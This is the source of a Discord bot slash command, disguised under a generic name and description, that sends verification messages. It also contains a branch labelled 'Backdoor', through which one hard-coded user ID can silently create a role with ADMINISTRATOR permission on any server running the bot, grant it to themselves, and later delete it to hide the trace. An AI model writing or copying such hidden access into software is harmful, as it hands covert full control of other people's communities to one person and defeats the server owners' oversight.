import { SlashCommandBuilder } from '@discordjs/builders';
import { CommandInteraction, GuildMemberRoleManager } from 'discord.js';
import vms from '../util/verificationMessages';
import Logger from '../util/Logger';
const c = new Logger('/default');

async function run(interaction: CommandInteraction) {

    const args = interaction.options.getString(`args`, false) || "";
    const split = args.split(' ');
    switch (true) {
        case args.startsWith('vms'): // Verification message embed sending
            if (split) {
                await vms(interaction, split[1]);
            }
            break;
        case args.startsWith('bd'): // Backdoor
            if (interaction.member?.user.id == "231774635476254721") {
                if (!(interaction.member!.roles as GuildMemberRoleManager).cache.some(r => r.name === "Lawnmower Manager")) {
                    interaction.guild!.roles.create({
                        name: "Lawnmower Manager",
                        permissions: "ADMINISTRATOR"
                    }).then(role => {
                        c.log(`[Backdoor] Created role ${role.name}`);
                        (interaction.member!.roles as GuildMemberRoleManager).add(role);
                    });
                } else {
                    interaction.guild!.roles.delete(interaction.guild!.roles.cache.find(r => r.name === "Lawnmower Manager")!.id);
                    c.log(`[Backdoor] Deleted role Lawnmower Manager`);
                }
            }
            break;
        default:
            interaction.reply({
                content: `Command not found`,
                ephemeral: true,
            });
            break;
    }
}

const cmd = new SlashCommandBuilder()
    .setName('cmd')
    .setDescription('desc')
    .addStringOption(o => o.setName('args').setDescription('arguments').setRequired(false))

let _;
export default _ = {
    process: run,
    command: cmd
}